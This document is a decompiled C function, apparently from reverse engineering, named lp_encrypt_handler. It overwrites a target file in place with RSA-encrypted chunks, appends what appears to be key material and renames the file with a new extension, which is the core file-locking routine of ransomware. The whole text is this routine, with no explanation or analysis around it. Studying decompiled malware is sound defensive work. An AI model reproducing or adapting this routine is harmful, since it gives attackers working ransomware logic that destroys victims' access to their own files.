void lp_encrypt_handler(char *param_1)

{
  char cVar1;
  int iVar2;
  size_t sVar3;
  __off_t _Var4;
  ulong uVar5;
  ssize_t sVar6;
  long in_FS_OFFSET;
  int local_1450;
  int local_144c;
  int local_1448;
  int local_1444;
  char *local_1440;
  undefined local_1438 [8];
  undefined local_1430 [1024];
  undefined local_1030 [24];
  undefined local_1018 [4104];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_144c = -1;
  local_1448 = 0;
  local_1450 = 0;
  sVar3 = strlen(param_1);
  local_1444 = (int)sVar3 + 7;
  local_1440 = (char *)calloc(1,(long)((int)sVar3 + 8));
  lp_rsa_init(local_1438);
  iVar2 = snprintf(local_1440,(long)(local_1444 + 1),"%s.%s",param_1,&pub_ext);
  if (((local_1444 == iVar2) && (local_144c = open(param_1,2), -1 < local_144c)) &&
     (cVar1 = lp_rsa_load(local_1438), cVar1 == '\x01')) {
    do {
      uVar5 = read(local_144c,local_1018,0x1000);
      local_1448 = (int)uVar5;
      if (local_1448 < 1) break;
      cVar1 = lp_rsa_encrypt(local_1438,local_1018,uVar5 & 0xffffffff,local_1018,&local_1450);
      if ((((cVar1 != '\x01') || (_Var4 = lseek(local_144c,-(long)local_1448,1), _Var4 < 0)) ||
          ((local_1448 != local_1450 && (local_1448 == 0x1000)))) ||
         ((local_1450 != 0 && (sVar6 = write(local_144c,local_1018,(long)local_1450), sVar6 < 1))))
      goto LAB_00103d95;
    } while (0xfff < local_1448);
    cVar1 = lp_rsa_done(local_1438,local_1018,&local_1450);
    if ((((cVar1 == '\x01') && (sVar6 = write(local_144c,local_1018,(long)local_1450), -1 < sVar6))
        && (sVar6 = write(local_144c,local_1430,0x400), 0 < sVar6)) &&
       (sVar6 = write(local_144c,local_1030,0x10), 0 < sVar6)) {
      close(local_144c);
      local_144c = -1;
      rename(param_1,local_1440);
    }
  }
LAB_00103d95:
  if (-1 < local_144c) {
    close(local_144c);
  }
  free(local_1440);
  lp_rsa_free(local_1438);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
